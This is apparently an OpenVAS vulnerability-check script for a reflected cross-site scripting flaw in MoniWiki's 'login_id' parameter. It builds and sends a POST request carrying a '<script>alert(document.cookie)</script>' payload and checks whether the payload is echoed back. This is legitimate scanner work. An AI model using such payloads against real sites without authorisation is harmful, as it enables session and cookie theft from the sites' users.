###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_moniwiki_login_xss_vuln.nasl 12 2013-10-27 11:15:33Z jan $
#
# MoniWiki 'login_id' Cross-Site Scripting Vulnerability
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2012 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attacker to execute arbitrary HTML and
  script code in a user's browser session in context of an affected site.
  Impact Level: Application";
tag_affected = "MoniWiki version 1.1.5 and prior.";
tag_insight = "The flaw is due to an input passed to the 'login_id' POST parameter in
  'wiki.php' (when 'action' is set to 'userform') is not properly sanitised
  before being returned to the user.";
tag_solution = "No solution or patch is available as of 21st, February 2012. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://moniwiki.kldp.net/wiki.php";
tag_summary = "This host is running MoniWiki and is prone to cross site scripting
  vulnerability.";

if(description)
{
  script_id(902794);
  script_version("$Revision: 12 $");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2012-02-21 17:36:32 +0530 (Tue, 21 Feb 2012)");
  script_name("MoniWiki 'login_id' Cross-Site Scripting Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://secunia.com/advisories/48109");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/17835");
  script_xref(name : "URL" , value : "http://www.securelist.com/en/advisories/48109");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/109902/moniwiki-xss.txt");

  script_description(desc);
  script_summary("Check if MoniWiki is prone to XSS");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2012 SecPod");
  script_family("Web application abuses");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");

## Variable Initialization
port = 0;
sndReq = "";
rcvRes = "";
monRes = "";
dir = "";

## Get HTTP Port
port = get_http_port(default:80);
if(!port){
  exit(0);
}

## Check Host Supports PHP
if(!can_host_php(port:port)){
  exit(0);
}

foreach dir (make_list("/moniwiki", "/MoniWiki", cgi_dirs()))
{
  sndReq = http_get(item:string(dir, "/wiki.php"), port:port);
  rcvRes = http_send_recv(port:port, data:sndReq);

  ## confirm the application
  if(rcvRes && "powered by MoniWiki" >< rcvRes)
  {
    ## Construct attack
    postdata = "action=userform&login_id=<script>alert(document.cookie)" +
               "</script>&password=<script>alert(document.cookie)</script>";

    monReq = string("POST ", dir, "/wiki.php/FrontPage HTTP/1.1\r\n",
                    "Host: ", get_host_name(), "\r\n",
                    "User-Agent:  MoniWiki-XSS-Test\r\n",
                    "Content-Type: application/x-www-form-urlencoded\r\n",
                    "Content-Length: ", strlen(postdata), "\r\n",
                    "\r\n", postdata);

    monRes = http_send_recv(port:port, data:monReq);

    ## Confirm exploit worked properly or not
    if(monRes && "<script>alert(document.cookie)</script>" >< monRes)
    {
      security_warning(port);
      exit(0);
    }
  }
}
